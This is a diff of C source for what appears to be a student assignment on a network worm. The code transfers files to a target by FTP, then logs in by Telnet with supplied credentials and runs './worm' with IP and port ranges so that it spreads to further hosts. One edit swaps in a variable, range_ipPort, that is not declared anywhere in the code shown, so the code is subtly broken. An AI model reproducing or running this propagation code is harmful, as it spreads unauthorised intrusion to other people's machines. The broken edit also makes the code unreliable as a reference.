@@ -82,7 +82,7 @@ void fileTransfer(char *ip, char *username, char *password){
     char stru[10] = "STRU F\n";
     char pasv[10] = "PASV\n";
     char cwd[100] = "CWD /home/";
-    char cwdWD[100] = "CWD Asgn03HK/\n";
+    char cwdWD[100] = "CWD Asgn03KLG/\n";
     char pwd[10] = "PWD\n";
     char mkd[20] = "MKD Asgn03KLG\n";
     char quit[10] = "QUIT\n";
@@ -320,6 +320,7 @@ void fileTransfer(char *ip, char *username, char *password){
 
 void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){
     char buff[1024];
+    char ips[100];
     char *tamKey;
     FILE *file;
     pid_t child; // note that the actual return type of fork is 
@@ -329,6 +330,7 @@ void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char 
     printf("====================================\n");
     printf("Executando Telnet");
     printf("\n====================================\n");
+
 
     child = vfork();
     if (child == -1){
@@ -392,7 +394,7 @@ void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char 
         strcpy(buff, "./worm ");
         strcat(buff, range_ipSeq);
         strcat(buff," ");
-        strcat(buff, range_portSeq);
+        strcat(buff, range_ipPort);
         strcat(buff," ");
         strcat(buff, tamKey);
         strcat(buff,"\n");
@@ -403,6 +405,7 @@ void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char 
         sleep(2);
         fprintf(file, "exit\n");
         
+        sleep(100);
         pclose(file);
         _exit(23);
     }
